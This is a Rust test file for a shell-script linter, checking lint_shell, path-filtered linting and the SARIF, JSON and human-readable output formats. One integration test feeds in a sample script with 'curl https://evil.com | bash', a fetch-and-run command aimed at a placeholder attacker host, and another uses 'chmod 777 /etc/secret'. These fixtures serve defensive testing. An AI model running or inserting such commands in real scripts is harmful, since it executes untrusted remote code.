//! Coverage tests for linter/rules/mod.rs -- targeting lint_shell() and lint_shell_with_path()
//! (which exercises lint_shell_filtered()).
//!
//! Each call to lint_shell() exercises ALL ~400 sequential result.merge() lines in the function
//! body, covering SC1xxx, SC2xxx, DET, IDEM, SEC, PERF, PORT, and REL rule invocations.
//! Each call to lint_shell_with_path() exercises the filtered variant with apply_rule! macro.
//!
//! Additional tests cover write_results (SARIF/JSON/Human output formatters) and the
//! LintProfile type.

#![allow(clippy::unwrap_used)]
#![allow(clippy::expect_used)]

use crate::linter::output::{write_results, OutputFormat};
use crate::linter::rules::{lint_shell, lint_shell_with_path, LintProfile};
use crate::linter::{Diagnostic, Fix, LintResult, Severity, Span};
use std::path::Path;

// =============================================================================
// lint_shell -- empty and minimal inputs
// =============================================================================

#[test]
fn test_lint_profile_default() {
    let profile: LintProfile = Default::default();
    assert_eq!(profile, LintProfile::Standard);
}

// =============================================================================
// write_results -- SARIF / JSON / Human output formatters via public API
// =============================================================================

#[test]
fn test_write_results_sarif_empty() {
    let result = LintResult::new();
    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Sarif, "test.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    // Should be valid JSON with SARIF structure
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();
    assert_eq!(parsed["version"], "2.1.0");
    assert!(parsed["runs"].is_array());
    let results = &parsed["runs"][0]["results"];
    assert!(results.is_array());
    assert_eq!(results.as_array().unwrap().len(), 0);
}

#[test]
fn test_write_results_sarif_with_diagnostics() {
    let mut result = LintResult::new();
    let span = Span::new(1, 5, 1, 20);
    result.add(Diagnostic::new(
        "SC2086",
        Severity::Warning,
        "Double quote to prevent globbing and word splitting",
        span,
    ));
    result.add(Diagnostic::new(
        "SEC001",
        Severity::Error,
        "Potential command injection",
        Span::new(3, 1, 3, 30),
    ));

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Sarif, "my_script.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();

    let sarif_results = parsed["runs"][0]["results"].as_array().unwrap();
    assert_eq!(sarif_results.len(), 2);
    assert_eq!(sarif_results[0]["ruleId"], "SC2086");
    assert_eq!(sarif_results[0]["level"], "warning");
    assert_eq!(sarif_results[1]["ruleId"], "SEC001");
    assert_eq!(sarif_results[1]["level"], "error");

    // Check location
    let loc = &sarif_results[0]["locations"][0]["physicalLocation"];
    assert_eq!(loc["artifactLocation"]["uri"], "my_script.sh");
    assert_eq!(loc["region"]["startLine"], 1);

    // Check fingerprints
    assert!(sarif_results[0]["partialFingerprints"]["primaryLocationLineHash"].is_string());
}

#[test]
fn test_write_results_sarif_with_fix() {
    let mut result = LintResult::new();
    let span = Span::new(2, 1, 2, 10);
    let mut diag = Diagnostic::new("IDEM001", Severity::Warning, "Use mkdir -p", span);
    diag.fix = Some(Fix::new("mkdir -p /tmp/dir"));
    result.add(diag);

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Sarif, "setup.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();

    let sarif_results = parsed["runs"][0]["results"].as_array().unwrap();
    assert_eq!(sarif_results.len(), 1);
    let fixes = sarif_results[0]["fixes"].as_array().unwrap();
    assert_eq!(fixes.len(), 1);
    assert!(fixes[0]["description"]["text"]
        .as_str()
        .unwrap()
        .contains("mkdir -p"));
}

#[test]
fn test_write_results_sarif_severity_mapping() {
    // Test all severity levels map to correct SARIF levels
    let mut result = LintResult::new();
    let span = Span::new(1, 1, 1, 5);
    result.add(Diagnostic::new("E1", Severity::Error, "error", span));
    result.add(Diagnostic::new("W1", Severity::Warning, "warning", span));
    result.add(Diagnostic::new("R1", Severity::Risk, "risk", span));
    result.add(Diagnostic::new("P1", Severity::Perf, "perf", span));
    result.add(Diagnostic::new("I1", Severity::Info, "info", span));
    result.add(Diagnostic::new("N1", Severity::Note, "note", span));

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Sarif, "test.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();

    let sarif_results = parsed["runs"][0]["results"].as_array().unwrap();
    assert_eq!(sarif_results.len(), 6);
    // Error -> "error"
    assert_eq!(sarif_results[0]["level"], "error");
    // Warning -> "warning"
    assert_eq!(sarif_results[1]["level"], "warning");
    // Risk -> "warning"
    assert_eq!(sarif_results[2]["level"], "warning");
    // Perf -> "note"
    assert_eq!(sarif_results[3]["level"], "note");
    // Info -> "note"
    assert_eq!(sarif_results[4]["level"], "note");
    // Note -> "note"
    assert_eq!(sarif_results[5]["level"], "note");
}

#[test]
fn test_write_results_json_empty() {
    let result = LintResult::new();
    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Json, "test.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();
    assert!(parsed["diagnostics"].is_array());
    assert_eq!(parsed["diagnostics"].as_array().unwrap().len(), 0);
    assert_eq!(parsed["file"], "test.sh");
}

#[test]
fn test_write_results_json_with_diagnostics() {
    let mut result = LintResult::new();
    result.add(Diagnostic::new(
        "SC2086",
        Severity::Warning,
        "Quote this",
        Span::new(5, 10, 5, 20),
    ));

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Json, "script.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();
    assert_eq!(parsed["diagnostics"].as_array().unwrap().len(), 1);
    assert_eq!(parsed["diagnostics"][0]["code"], "SC2086");
    assert_eq!(parsed["diagnostics"][0]["severity"], "warning");
}

#[test]
fn test_write_results_human_empty() {
    let result = LintResult::new();
    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Human, "test.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    assert!(output.contains("No issues found"));
}

#[test]
fn test_write_results_human_with_diagnostics() {
    let mut result = LintResult::new();
    result.add(Diagnostic::new(
        "SEC001",
        Severity::Error,
        "Command injection",
        Span::new(3, 1, 3, 25),
    ));

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Human, "deploy.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    assert!(output.contains("SEC001"));
    assert!(output.contains("Command injection"));
    assert!(output.contains("1 error"));
}

// =============================================================================
// Integration: lint_shell() output fed to write_results()
// =============================================================================

#[test]
fn test_lint_then_write_sarif_integration() {
    let script = "echo $RANDOM\nmkdir /tmp/x\ncurl https://evil.com | bash\n";
    let result = lint_shell(script);
    assert!(!result.diagnostics.is_empty());

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Sarif, "bad_script.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();
    assert_eq!(parsed["version"], "2.1.0");
    let sarif_results = parsed["runs"][0]["results"].as_array().unwrap();
    assert!(
        !sarif_results.is_empty(),
        "SARIF output should contain results from lint_shell"
    );
}

#[test]
fn test_lint_then_write_json_integration() {
    let script = "cat file | grep x\necho $RANDOM\n";
    let result = lint_shell(script);
    assert!(!result.diagnostics.is_empty());

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Json, "messy.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();
    assert!(!parsed["diagnostics"].as_array().unwrap().is_empty());
}

#[test]
fn test_lint_then_write_human_integration() {
    let script = "chmod 777 /etc/secret\n";
    let result = lint_shell(script);

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Human, "unsafe.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    // Should produce some output (either "No issues" or actual diagnostics)
    assert!(!output.is_empty());
}

// =============================================================================
// Edge cases and boundary conditions
// =============================================================================

#[test]
fn test_lint_shell_single_newline() {
    let result = lint_shell("\n");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_binary_like_content() {
    // Non-shell content should not panic
    let result = lint_shell("\x00\x01\x02\x03");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_very_long_line() {
    let line = format!("echo {}\n", "x".repeat(10000));
    let result = lint_shell(&line);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_many_lines() {
    let mut script = String::new();
    for i in 0..200 {
        script.push_str(&format!("echo \"line {}\"\n", i));
    }
    let result = lint_shell(&script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_unknown_extension() {
    // Unknown extension should fall back to auto-detection
    let result = lint_shell_with_path(Path::new("script.xyz"), "#!/bin/bash\necho hello\n");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_no_path_component() {
    let result = lint_shell_with_path(Path::new(""), "echo hello\n");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_multiple_suppressions() {
    let script = r#"# shellcheck disable=SC2086,SC2002
echo $VAR
cat file | grep x
"#;
    let result = lint_shell(script);
    assert!(
        !result.diagnostics.iter().any(|d| d.code == "SC2086"),
        "SC2086 should be suppressed"
    );
}

#[test]
fn test_lint_shell_inline_suppression() {
    let script = "echo $VAR # shellcheck disable=SC2086\n";
    let result = lint_shell(script);
    // The suppression comment location matters -- this tests inline handling
    let _count = result.diagnostics.len();
}
